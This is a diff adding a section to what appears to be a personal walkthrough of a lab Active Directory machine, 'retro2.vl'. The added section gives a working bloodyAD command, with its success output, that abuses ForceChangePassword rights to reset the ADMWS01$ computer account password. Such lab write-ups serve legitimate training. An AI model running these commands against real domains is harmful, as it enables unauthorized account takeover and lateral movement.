@@ -228,3 +228,13 @@ Using the TGT i got from nxc i can collect the bloodhound data
 ![[Pasted image 20260330162750.png]]
 As seen from this image i have `ForceChangePassword` on the `ADMWS01`. The same is also true for `FS02` but i have already compromise that computer
 
+# Compromising `admws01$`
+```python
+bloodyAD -d retro2.vl -u 'FS01$' -k --host bln01.retro2.vl set password 'ADMWS01$' 'dmuhackers123!'
+[+] Password changed successfully!
+```
+This changed the password
+
+```python
+
+```
